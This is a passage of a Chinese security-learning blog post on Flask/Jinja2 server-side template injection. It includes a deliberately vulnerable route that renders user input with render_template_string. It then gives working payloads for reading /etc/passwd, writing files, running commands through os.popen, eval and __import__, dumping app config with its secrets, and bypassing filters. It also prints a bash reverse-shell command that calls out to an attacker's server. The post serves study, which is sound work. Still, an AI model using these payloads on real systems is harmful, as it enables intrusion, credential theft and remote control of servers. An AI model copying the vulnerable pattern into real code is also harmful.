+<h3 id="SSTI利用"><a href="#SSTI利用" class="headerlink" title="SSTI利用"></a>SSTI利用</h3><h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/xss&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss</span>():</span></span><br><span class="line">    code = flask.request.args.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    content = <span class="string">&#x27;&lt;p&gt;&#123;0&#125;&lt;/p&gt;&#x27;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112205055945.png" alt="image-20211112205055945"></p>
+<p>通过Flask库自带的request.args.get方法拿到get参数，并回传到页面之上。</p>
+<h4 id="任意文件读写"><a href="#任意文件读写" class="headerlink" title="任意文件读写"></a>任意文件读写</h4><p>此处需要上述的魔术方法进行利用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo2</span>():</span></span><br><span class="line">    code = flask.request.args.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    content = <span class="string">&#x27;&lt;p&gt;&#123;0&#125;&lt;/p&gt;&#x27;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(content)</span><br></pre></td></tr></table></figure>
+
+<p>通过以下魔术方法的综合利用，读写任意文件:</p>
+<ul>
+<li>获取字符串的类对象</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>寻找基类</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>返回object的子类</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>以字典格式返回当前位置的全部全局变量</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__globals__ 与func_globals等价</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用<code>__subclasses__()</code>方法寻找可用类</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line">小技巧: (<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()).index(file)可迅速定位索引我们所需要的的类位置</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112210103765.png">    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113112306415.png" alt="image-20211113112306415"></p>
+<p>通过基类引出可用引用，可以在其中发现一个&lt;type ‘file’&gt;</p>
+<ul>
+<li>构造读取文件payload:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__())[<span class="number">40</span>](<span class="string">&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113112917262.png" alt="image-20211113112917262"></p>
+<p>也可利用<code>__bases__</code>、<code>object.__subclasses__()</code>进行调用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">()..__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p><strong>写文件</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;i am render template inject!&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;,&#x27;w&#x27;).write(&#x27;i am Lihua&#x27;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;Object&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113114225347.png" alt="image-20211113114225347"></p>
+<p><strong>任意代码执行</strong></p>
+<p>思路与任意文件读取十分类似，通过基类拿到os模块，调用系统命令即可。</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># eval</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113122531519.png" alt="image-20211113122531519"></p>
+<p><strong>反弹shell</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/你的服务器地址/端口 0&gt;&amp;1&#x27;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个 Payload 不能直接放在 URL 中执行 , 因为 <code>&amp;</code> 的存在会导致 URL 解析出现错误,自然也可使用nc进行反弹shell，且无需编码<br> 可以使用 BurpSuite 等工具构造数据包再发送</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113123000881.png" alt="image-20211113123000881"></p>
+<p><strong>获取服务器环境信息</strong></p>
+<p>可利用语句获得部分服务器配置信息，如<code>SERVER_SOFTWARE</code>服务平台</p>
+<ul>
+<li></li>
+</ul>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113123437182.png" alt="image-20211113123437182"></p>
+<ul>
+<li>config.items</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/xss?payload=&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个类字典的对象，包含了所有应用程序的配置值</p>
+<p>在大多数情况下 , 它包含了比如数据库链接字符串 , 连接到第三方的凭证 , SECRET_KEY等敏感值</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113124027351.png" alt="image-20211113124027351"></p>
+<h4 id="沙箱绕过方式"><a href="#沙箱绕过方式" class="headerlink" title="沙箱绕过方式"></a>沙箱绕过方式</h4><p><strong>过滤小括号</strong></p>
+<p>利用python自带的内置函数</p>
+<ul>
+<li>get_flashed_messages()</li>
+<li>url_for()</li>
+</ul>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed.messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>访问变量属性方式</strong></p>
+<p>利用<code>.</code>拼接访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>[]</code>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这两种访问方式完全等价，可用于不严格的过滤</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113130142634.png" alt="image-20211113130142634"></p>
+<p>所以说，即便网站过滤点，我们还可使用中括号绕过</p>
+<p>如果想要调用字典的键值，其本质是调用了魔术方法<code>__getitem__</code></p>
+<p>所以在取字典中的键值时，不仅可以使用<code>[]</code>还可使用<code>__getitem__</code></p>
+<p>对于字典来说，我们也可以使用他自带的一些方法来调用其中的值，比如说<code>pop</code>方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop(key[,default])</span><br><span class="line">参数</span><br><span class="line">key: 要删除的键值</span><br><span class="line">default: 如果没有 key，返回 default 值</span><br><span class="line">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br></pre></td></tr></table></figure>
+
+<p>但是此方法会将字典中的键值删除，如果删除的是服务器关键参数，将会使得服务器崩溃，因此并不推荐其使用</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113132357745.png" alt="image-20211113132357745"></p>
+<p><strong>如果我们需要使用字典中的键值时</strong>，可以调用<code>dict.get(&#39;key&#39;) dict.setdefault(&#39;key&#39;)</code>获得键值</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113132557089.png" alt="image-20211113132557089"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">SSTI模板注入学习</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 Nayon 的个人博客">Nayon</a></p>
+        <p><span>发布时间:</span>2021年11月12日 - 19时02分</p>
+        <p><span>最后更新:</span>2021年11月13日 - 14时17分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="SSTI模板注入学习">http://antipassion.github.io/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://antipassion.github.io/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/　　作者: " title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          PE结构-PE文件的两种状态
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">利用php伪协议绕过die()</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SSTI模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%95%E4%B8%BASSTI"><span class="toc-number">1.1.</span> <span class="toc-text">何为SSTI?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">概念总结:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E6%B8%B2%E6%9F%93"><span class="toc-number">1.2.1.</span> <span class="toc-text">页面渲染</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.3.</span> <span class="toc-text">Flask模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">SSTI原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.5.</span> <span class="toc-text">沙箱逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E6%93%8E%E5%88%A4%E6%96%AD"><span class="toc-number">1.6.</span> <span class="toc-text">引擎判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E5%88%A9%E7%94%A8"><span class="toc-number">1.7.</span> <span class="toc-text">SSTI利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xss"><span class="toc-number">1.7.1.</span> <span class="toc-text">xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">1.7.2.</span> <span class="toc-text">任意文件读写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.7.3.</span> <span class="toc-text">沙箱绕过方式</span></a></li></ol></li></ol></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/" title="上一篇: PE结构-PE文件的两种状态">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/" title="下一篇: 利用php伪协议绕过die()">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/">PE结构-PE文件的两种状态</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">SSTI模板注入学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/">利用php伪协议绕过die()</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">利用session.upload_progress进行文件包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/">php代码审计学习-5</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/26/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4/">php代码审计学习-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/">PHP代码审计学习-3</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2/">php代码审计学习(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-1/">PHP代码审计学习-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">awd知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/18/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0/">DLL劫持学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/16/%E5%88%9D%E8%AF%95%E7%99%BD%E5%8A%A0%E9%BB%91/">初试白加黑（未写完)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/14/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96/">PE结构-VA与FOA的转化</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/14/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8(3)/">PE结构-导出表(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/13/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2)/">PE结构-导入表（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/12/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87(1)/">PE结构-系统解密篇（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">WinRM-横向移动</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2021 Nayon|1163875625@qq.com
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
